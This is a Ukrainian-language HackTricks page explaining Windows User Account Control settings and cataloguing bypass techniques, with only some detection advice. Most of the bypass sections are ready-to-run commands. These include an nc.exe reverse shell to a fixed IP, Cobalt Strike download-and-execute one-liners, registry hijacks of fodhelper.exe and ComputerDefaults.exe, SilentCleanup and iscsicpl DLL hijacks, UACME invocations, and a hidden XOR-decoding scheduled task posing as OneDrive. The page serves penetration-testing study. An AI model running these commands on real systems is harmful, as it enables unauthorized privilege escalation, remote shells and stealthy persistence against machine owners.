# UAC - Контроль облікових записів користувачів

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка виводить **запит на підтвердження дій із підвищеними правами**. Програми мають різні рівні `integrity`, а програма з **високим рівнем** може виконувати завдання, які **потенційно можуть скомпрометувати систему**. Коли UAC увімкнено, програми й завдання завжди **виконуються в контексті безпеки облікового запису без прав адміністратора**, якщо адміністратор явно не надасть їм доступ до системи на рівні адміністратора. Це зручна функція, яка захищає адміністраторів від ненавмисних змін, але не вважається межею безпеки.<sup>[[2]](#references)</sup>

Докладніше про рівні цілісності:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC увімкнено, користувач-адміністратор отримує 2 токени: стандартний токен користувача для звичайних дій із середнім рівнем цілісності та токен із правами адміністратора.

На цій [сторінці](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) докладно описано роботу UAC, зокрема процес входу, взаємодію з користувачем і архітектуру UAC.<sup>[[2]](#references)</sup> Адміністратори можуть налаштувати роботу UAC за допомогою політик безпеки відповідно до потреб своєї організації: локально (через secpol.msc) або через конфігурацію та розгортання за допомогою об’єктів групової політики (GPO) у домені Active Directory. Різні параметри докладно описано [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Для UAC можна налаштувати 10 параметрів групової політики. У таблиці нижче наведено додаткові відомості:

| Параметр групової політики                                                                                                                                                                                                                                                                                                                                                           | Ключ реєстру                | Значення за замовчуванням                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Контроль облікових записів користувачів: режим схвалення адміністратором для вбудованого облікового запису адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Вимкнено)                                             |
| [Контроль облікових записів користувачів: поведінка запиту на підвищення прав для адміністраторів у режимі схвалення адміністратором](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Запитувати підтвердження для бінарних файлів, що не належать Windows, на захищеному робочому столі) |
| [Контроль облікових записів користувачів: поведінка запиту на підвищення прав для стандартних користувачів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Запитувати облікові дані на захищеному робочому столі)         |
| [Контроль облікових записів користувачів: виявляти інсталяції програм і запитувати підвищення прав](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Увімкнено; за замовчуванням вимкнено у випуску Enterprise)           |
| [Контроль облікових записів користувачів: підвищувати права лише для підписаних і перевірених виконуваних файлів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Вимкнено)                                             |
| [Контроль облікових записів користувачів: підвищувати права для програм UIAccess, лише якщо їх інстальовано в безпечних розташуваннях](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Увімкнено)                                              |
| [Контроль облікових записів користувачів: запускати всіх адміністраторів у режимі схвалення адміністратором](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Увімкнено)                                              |
| [Контроль облікових записів користувачів: дозволяти програмам UIAccess запитувати підвищення прав без використання захищеного робочого столу](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Вимкнено)                                             |
| [Контроль облікових записів користувачів: переходити на захищений робочий стіл під час запиту на підвищення прав](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Увімкнено)                                              |
| [Контроль облікових записів користувачів: віртуалізувати помилки запису файлів і реєстру, спрямовуючи їх до розташувань користувача](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Увімкнено)                                              |

### Політики інсталяції програмного забезпечення у Windows

За замовчуванням **локальні політики безпеки** (у більшості систем — «secpol.msc») налаштовані так, щоб **заборонити користувачам без прав адміністратора встановлювати програмне забезпечення**. Це означає, що навіть якщо користувач без прав адміністратора може завантажити інсталятор вашої програми, він не зможе запустити його без облікового запису адміністратора.

### Ключі реєстру для примусового запиту UAC на підвищення прав

Як стандартний користувач без прав адміністратора ви можете налаштувати запит UAC на введення облікових даних для «стандартного» облікового запису під час спроби виконати певні дії. Для цього потрібно змінити певні **ключі реєстру**, що вимагає прав адміністратора, якщо тільки немає **UAC bypass** або зловмисник уже не ввійшов у систему як адміністратор.

Навіть якщо користувач входить до групи **Administrators**, ці зміни змушують його **повторно ввести облікові дані свого облікового запису** для виконання адміністративних дій.

**На практиці це корисно лише тоді, коли ви вже маєте токен із підвищеними правами, UAC bypass або неправильну конфігурацію, що дозволяє змінювати ці ключі; інакше запис до реєстру буде заблоковано.**

Потрібно змінити такі ключі й записи реєстру (значення за замовчуванням наведено в дужках):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Це також можна зробити вручну за допомогою інструмента «Локальна політика безпеки». Після внесення змін для виконання адміністративних операцій користувачеві буде запропоновано повторно ввести облікові дані.

### Примітка

**Контроль облікових записів користувачів не є межею безпеки.** Тому стандартні користувачі не можуть вийти за межі своїх облікових записів і отримати права адміністратора без експлойта локального підвищення привілеїв.

### Попросити користувача надати «повний доступ до комп’ютера»

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Привілеї UAC

- Захищений режим Internet Explorer використовує перевірки цілісності, щоб не дозволяти процесам із високим рівнем цілісності (наприклад, веббраузерам) отримувати доступ до даних із низьким рівнем цілісності (наприклад, папки тимчасових файлів Internet). Для цього браузер запускається з токеном низького рівня цілісності. Коли браузер намагається отримати доступ до даних у зоні низького рівня цілісності, операційна система перевіряє рівень цілісності процесу й відповідно надає доступ. Ця функція допомагає запобігти тому, щоб атаки віддаленого виконання коду отримували доступ до конфіденційних даних у системі.
- Коли користувач входить у Windows, система створює маркер доступу, який містить список привілеїв користувача. Привілеї визначаються як сукупність прав і можливостей користувача. Маркер також містить список облікових даних користувача, які використовуються для автентифікації користувача на комп’ютері та доступу до ресурсів у мережі.

### Autoadminlogon

Щоб налаштувати автоматичний вхід до Windows для певного користувача під час запуску, задайте **ключ реєстру `AutoAdminLogon`**. Це корисно для кіоск-систем або тестування. Використовуйте цю функцію лише в захищених системах, оскільки пароль зберігатиметься у відкритому вигляді в реєстрі.

Задайте такі ключі за допомогою редактора реєстру або `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = ім’я користувача
  - `DefaultPassword` = пароль

Щоб повернути стандартний спосіб входу, задайте для `AutoAdminLogon` значення 0.

## Обхід UAC

> [!TIP]
> Зауважте: якщо у вас є графічний доступ до жертви, обійти UAC просто — достатньо натиснути «Так», коли з’явиться запит UAC.

Обхід UAC потрібен у такій ситуації: **UAC увімкнено, ваш процес працює в контексті із середнім рівнем цілісності, а ваш користувач належить до групи адміністраторів**.

Важливо зазначити, що **обійти UAC набагато складніше, якщо для нього встановлено найвищий рівень безпеки (Always), ніж якщо встановлено будь-який інший рівень (Default).**

### Швидка перевірка з оболонки із середнім рівнем цілісності

Перш ніж спробувати обхід, переконайтеся, що ви перебуваєте в потрібній ситуації, і визначте збірку хоста, щоб підібрати відомі робочі методи:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Практичні примітки:
- Якщо `EnableLUA=0`, bypass не потрібен: будь-який токен адміністратора може безпосередньо запросити високий рівень цілісності.
- `ConsentPromptBehaviorAdmin=2` або `5` — типовий сценарій для auto-elevate / COM-based bypasses.
- `Always Notify` підвищує планку, але все одно слід перевірити конкретну збірку, а не припускати, що нічого не спрацює: UACME досі відстежує деякі методи, сумісні з `AlwaysNotify`, у сучасних збірках Windows.<sup>[[3]](#references)</sup>

### UAC вимкнено

Якщо UAC уже вимкнено (`ConsentPromptBehaviorAdmin` дорівнює **`0`**), можна **запустити reverse shell із правами адміністратора** (високий рівень цілісності), наприклад:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### Обхід UAC за допомогою дублювання токена

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + повторно використовуваний об’єкт налагодження

Інтерфейс AppInfo local RPC `201ef99a-7fa0-444c-9399-19ba84f12a1a` може створювати процеси з увімкненим налагодженням. Процеси, створені для налагодження в одному потоці, використовують спільний об’єкт налагодження цього потоку; подія створення містить дескриптор процесу з повним доступом, навіть якщо результат RPC надає лише обмежений доступ. Це перетворює повторне використання об’єкта налагодження на примітив UAC для користувача із середнім рівнем цілісності, який входить до групи Administrators.<sup>[[11]](#references)[[12]](#references)</sup>

Практичний ланцюжок дій:<sup>[[11]](#references)[[12]](#references)</sup>

1. Викличте метод local RPC (безпосередньо або через `NdrAsyncClientCall`), щоб створити не підвищений привілейований тестовий процес із увімкненим налагодженням.
2. Запитайте `ProcessDebugObjectHandle` за допомогою `NtQueryInformationProcess`, від’єднайте його через `NtRemoveProcessDebug`, збережіть об’єкт і завершіть тестовий процес.
3. Використайте той самий інтерфейс RPC, щоб створити довірений процес з автоматичним підвищенням привілеїв, а потім прив’яжіть збережений об’єкт до потоку, що викликає функцію, через `DbgUiSetThreadDebugObject`.
4. Викличте `WaitForDebugEvent` і отримайте дескриптор процесу з події `CREATE_PROCESS_DEBUG_EVENT`; перш ніж продовжити, продублюйте його за допомогою `NtDuplicateObject`.
5. Передайте продубльований дескриптор у `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` і запустіть payload зі структурою розширеної інформації про запуск. Це дає змогу повторно використати контекст підвищених привілеїв процесу, а також створити для дочірнього процесу довірчий вигляд зв’язку з батьківським процесом.

Шукайте цей короткий ланцюжок дій, а не лише бінарний файл з автоматичним підвищенням привілеїв: створення процесу через local AppInfo RPC, запити `ProcessDebugObjectHandle`, від’єднання/повторне прив’язування налагоджувача, негайна подія створення для налагодження, дублювання дескриптора та дочірній процес, у якого записаний батьківський процес не збігається з процесом, що викликав API створення.<sup>[[12]](#references)</sup>

### **Дуже** базовий «обхід» UAC (повний доступ до файлової системи)

Якщо у вас є shell від користувача, який входить до групи Administrators, ви можете **підключити спільний ресурс C$** через SMB (файлову систему) локально як новий диск і отримати **доступ до всього в файловій системі** (навіть до домашньої папки Administrator).

> [!WARNING]
> **Схоже, цей трюк більше не працює**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Обхід UAC за допомогою Cobalt Strike

Методи Cobalt Strike працюватимуть лише за умови, що UAC не встановлено на максимальний рівень безпеки.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** і **Metasploit** також мають кілька модулів для **обходу** **UAC**.

### Підвищені COM-інтерфейси (`ICMLuaUtil` / `CMSTPLUA`)

Автоматично підвищувані COM-об’єкти залишаються практичним вектором для обходу UAC у сучасних збірках. UACME і далі відстежує `ICMLuaUtil` як робочий на поточних гілках Windows, а інструменти для offensive security продовжують адаптувати `CMSTPLUA`, поєднуючи інтерактивний процес робочого столу, 64-бітне виконання та іноді маскування PEB/процесу перед викликом COM Elevation Moniker.<sup>[[3]](#references)</sup>

Практичні поради:
- Віддавайте перевагу **64-бітному** процесу в **інтерактивному сеансі** користувача (зазвичай це `explorer.exe` або його дочірній процес).
- Якщо звичайна оболонка не працює, спробуйте BOF / реалізацію UACME замість наївної обгортки `CreateProcess`.
- Очікуйте, що дочірній процес запуститься в **окремому підвищеному процесі**; багато BOF не підвищують привілеї поточного beacon на місці.

### KRBUACBypass

Документація та інструмент: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Експлойти для обходу UAC

[**UACME**](https://github.com/hfiref0x/UACME) — це набір технік обходу UAC. Зберіть його за допомогою Visual Studio або MSBuild; під час збірки створюється кілька виконуваних файлів (наприклад, `Source\Akagi\output\x64\Debug\Akagi.exe`), тож виберіть метод, що відповідає збірці цільової системи.<sup>[[3]](#references)</sup>\
Будьте обережні: деякі методи обходу запускають видимі програми або вікна запитів, які можуть привернути увагу користувача.<sup>[[3]](#references)</sup>

В UACME зазначено **версію збірки, починаючи з якої працює кожна техніка**.<sup>[[3]](#references)</sup> Ви можете знайти техніку, що впливає на ваші версії:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Також за допомогою сторінки [цієї](https://en.wikipedia.org/wiki/Windows_10_version_history) можна визначити випуск Windows `1607` за версією збірки.

Практичний робочий процес: спочатку **оцінити збірку хоста**, а вже потім запускати відповідний метод:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` швидко порівнює локальну збірку з відомими методами UAC, що допомагає швидко відкидати PoC, які вже не працюють.<sup>[[4]](#references)</sup>
- `UACME` залишається найкращим загальнодоступним каталогом для зіставлення обходу з конкретною збіркою. У версії 3.7.1 додано методи 83–85, а попередній випуск повторно перевірив наявні методи на **Windows 11 25H2**; перевіряйте таблицю методів і примітки до випуску, а не вважайте, що старий PoC і далі працює без змін.<sup>[[3]](#references)[[9]](#references)</sup>

### Ланцюжки WNF/UIAccess, сумісні з Always Notify (UACME 3.7.1)

`Always Notify` не усуває всі способи обходу UAC. UACME 3.7.1 реалізує три нові методи для x64, які поєднують контрольовані користувачем змінні середовища/стан протоколу з поведінкою підвищених запланованих завдань або UIAccess, і позначає їх усі як `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** перенаправити `SystemRoot`, щоб викликане WNF завдання `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` змусило підвищений `taskhostw.exe` виконати side-load `unifiedconsent.dll`. За даними UACME, цей метод працює починаючи зі збірки Windows 10 19041.
- **84 — TabTip:** застосувати той самий примітив зі змінними середовища до UIAccess `TabTip.exe`, який завантажує `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` або `rsaenh.dll` залежно від збірки, а потім виконати pivot із контексту UIAccess із високим рівнем цілісності. За даними UACME, цей метод працює починаючи з Windows 8.1 / Server 2016.
- **85 — Narrator:** перехопити протокол `feedback-hub` для поточного користувача, керувати Narrator за допомогою `Alt+CapsLock+F`, а потім запустити доступну для запису копію `osk.exe`, яка виконає side-load `OskSupport.dll`. Для цього потрібен інтерактивний робочий стіл. За даними UACME, метод працює починаючи з Windows 10 1809 / Server 2019.

Після створення модулів payload і Akagi відповідно до документації UACME викличте відповідний номер методу (необов’язкова команда за замовчуванням — `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Методи 84 і 85 залежать від UIAccess/взаємодії з робочим столом, тому не очікуйте, що вони працюватимуть без змін із Session 0 або з неінтерактивної оболонки служби. Усі три методи змінюють стан середовища/протоколу та розміщують DLL-файли; перевірте реалізацію та видаліть ці артефакти після тестування.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений бінарний файл `fodhelper.exe` автоматично підвищує рівень привілеїв у сучасних версіях Windows. Під час запуску він перевіряє наведений нижче шлях реєстру поточного користувача, не перевіряючи дієслово `DelegateExecute`. Розміщення там команди дає змогу процесу з рівнем цілісності Medium (якщо користувач входить до групи Administrators) запустити процес із рівнем цілісності High без запиту UAC.

Шлях реєстру, який перевіряє fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Кроки PowerShell (задайте payload, а потім запустіть)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Примітки:
- Працює, якщо поточний користувач входить до групи Administrators, а рівень UAC — типовий/пом’якшений (не Always Notify з додатковими обмеженнями).
- Використовуйте шлях `sysnative`, щоб запустити 64-бітний PowerShell із 32-бітного процесу в 64-бітній Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шляхом до EXE). Щоб діяти непомітно, уникайте інтерфейсів із запитами на підтвердження.

#### Тригер `ComputerDefaults.exe` для того самого обробника `ms-settings`

`ComputerDefaults.exe` використовує ту саму асоціацію `ms-settings\Shell\Open\command` для поточного користувача, що й `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Після встановлення команди за замовчуванням і порожнього значення `DelegateExecute`, як описано вище, скористайтеся `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` як альтернативним тригером; повторно налаштовувати реєстр не потрібно.<sup>[[13]](#references)[[14]](#references)</sup> Передумови щодо адміністратора з рівнем цілісності medium та політики UAC, наведені вище в примітках про `fodhelper.exe`, також залишаються чинними.<sup>[[2]](#references)[[3]](#references)</sup> У каталозі UACME цей тригер зазначено для Windows 10 RS4 (build 17134), тому перевірте його на цільовій збірці.<sup>[[3]](#references)</sup>

#### Варіант із перехопленням CurVer/розширення (лише HKCU)

У нещодавніх зразках, що зловживають `fodhelper.exe`, не використовують `DelegateExecute`, а натомість **перенаправляють ProgID `ms-settings`** через значення `CurVer` для поточного користувача. Бінарний файл з автоматичним підвищенням привілеїв і далі шукає обробник у `HKCU`, тож для створення ключів права адміністратора не потрібні:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Після підвищення привілеїв шкідливе ПЗ зазвичай **вимикає майбутні запити** встановленням `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` у значення `0`, а потім вдається до додаткових методів ухилення від захисту (наприклад, `Add-MpPreference -ExclusionPath C:\ProgramData`) і повторно створює механізм закріплення, щоб запускатися з високим рівнем цілісності. Типове завдання для закріплення зберігає на диску **зашифрований за допомогою XOR скрипт PowerShell**, який щогодини декодується та виконується в пам’яті:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Цей варіант усе ще видаляє dropper і залишає лише staged payloads, тому виявлення залежить від моніторингу **перехоплення `CurVer`**, підміни `ConsentPromptBehaviorAdmin`, створення виключення в Defender або запланованих завдань, які розшифровують PowerShell у пам’яті.<sup>[[5]](#references)</sup>

### Обхід UAC через завдання `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` запускає `cleanmgr.exe` з найвищими привілеями та підставляє `%windir%` зі змінних середовища користувача. Якщо ви контролюєте `HKCU\Environment\windir`, можна спрямувати це підставлення на довільну команду й отримати високий рівень цілісності без діалогового вікна згоди.<sup>[[8]](#references)</sup> Цей метод досі варто тестувати на новіших збірках, оскільки UACME і надалі підтримує цю техніку, а нещодавнє відстеження проблем свідчить, що для Windows 11 24H2 можуть знадобитися лише незначні зміни в лапках.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Якщо в цій збірці завдання бере шлях у лапки, повторіть спробу з payload, що закінчується лапкою (наприклад, `cmd.exe"`). Після тестування завжди очищайте `HKCU\Environment\windir`.

#### Ще один спосіб обійти UAC

Для багатьох класичних способів обходу UAC, що використовують UI-процеси, COM-об’єкти або взаємодію з робочим столом, потрібна **повноцінна інтерактивна session** із жертвою; звичайного shell через `nc.exe` або служби, запущеної в **Session 0**, часто недостатньо.

Зазвичай це можна вирішити за допомогою session **meterpreter**. Виконайте міграцію до **process**, у якого значення **Session** дорівнює **1**:

![Спрямуйте ms-settings на власне розширення (.thm) і прив’яжіть це розширення до нашого payload — ще один спосіб обійти UAC: можна скористатися session meterpreter. Виконайте міграцію до process, у якого Session...](<../../images/image (863).png>)

(_explorer.exe_ має працювати)

### Обхід UAC через GUI

Якщо у вас є доступ до **GUI**, ви можете просто підтвердити запит UAC, коли він з’явиться; технічний обхід насправді не потрібен. Тому отримання GUI session часто достатньо, щоб усунути практичні перешкоди, які створює UAC.

Крім того, якщо ви отримаєте GUI session, якою хтось користувався (можливо, через RDP), у ній можуть працювати **деякі інструменти від імені адміністратора**. З них можна, наприклад, безпосередньо **запустити** **cmd** **від імені адміністратора**, і UAC більше не показуватиме запит, як у [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи **непомітніше**.

### Гучний brute-force обхід UAC

Якщо шум не проблема, інструмент на кшталт [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) може багаторазово запитувати підвищення привілеїв, доки користувач не погодиться.

### Власний обхід — базова методологія обходу UAC

Якщо переглянути **UACME**, можна помітити, що **багато способів обходу UAC використовують DLL hijacking** (часто змушуючи підвищений бінарний файл завантажити DLL, контрольовану атакувальником, із доступного для запису шляху). [Прочитайте це, щоб дізнатися, як знаходити вразливість DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть бінарний файл, який виконує **autoelevate** (переконайтеся, що під час запуску він працює з високим рівнем цілісності).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Імовірно, вам доведеться **записати** DLL у **захищені шляхи** (наприклад, C:\Windows\System32), куди у вас немає дозволу на запис. Це можна обійти так:
   1. **wusa.exe**: Windows 7, 8 і 8.1. Дає змогу розпакувати вміст CAB-файлу в захищені шляхи (оскільки цей інструмент запускається з високим рівнем цілісності).
   2. **IFileOperation**: Windows 10.
4. Підготуйте **script**, який копіює вашу DLL у захищений шлях і запускає вразливий бінарний файл, що виконує autoelevate.

### Ще один спосіб обійти UAC

Суть полягає в тому, щоб перевірити, чи намагається **autoElevated binary** прочитати з **реєстру** **назву/шлях** **бінарного файлу** або **команду**, яку потрібно **виконати** (це особливо цікаво, якщо бінарний файл шукає ці дані в **HKCU**).

### Обхід UAC через `SysWOW64\iscsicpl.exe` + DLL hijack через `PATH` користувача

32-бітний `C:\Windows\SysWOW64\iscsicpl.exe` — це бінарний файл із **auto-elevation**, який можна змусити завантажити `iscsiexe.dll` відповідно до порядку пошуку. Якщо розмістити шкідливу `iscsiexe.dll` у папці, **доступній для запису користувачу**, а потім змінити `PATH` поточного користувача (наприклад, через `HKCU\Environment\Path`), щоб Windows шукала DLL у цій папці, Windows може завантажити DLL атакувальника в підвищений процес `iscsicpl.exe` **без показу запиту UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Практичні примітки:
- Це корисно, коли поточний користувач входить до групи **Administrators**, але через UAC працює з рівнем **Medium Integrity**.
- Для цього способу обходу потрібна копія в **SysWOW64**. Вважайте копію в **System32** окремим бінарним файлом і перевіряйте її поведінку окремо.
- Цей метод поєднує **auto-elevation** і **DLL search-order hijacking**, тож для перевірки відсутнього завантаження DLL можна скористатися тим самим робочим процесом у ProcMon, що й для інших способів обходу UAC.

Мінімальна послідовність дій:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ідеї для виявлення:
- Створюйте сповіщення про `reg add` / записи до реєстру в `HKCU\Environment\Path`, за якими одразу запускається `C:\Windows\SysWOW64\iscsicpl.exe`.
- Шукайте `iscsiexe.dll` у розташуваннях, **контрольованих користувачем**, наприклад `%TEMP%` або `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Зіставляйте запуски `iscsicpl.exe` з неочікуваними дочірніми процесами або завантаженням DLL з каталогів поза стандартними каталогами Windows.

### Новіші дослідження, які варто перевірити окремо

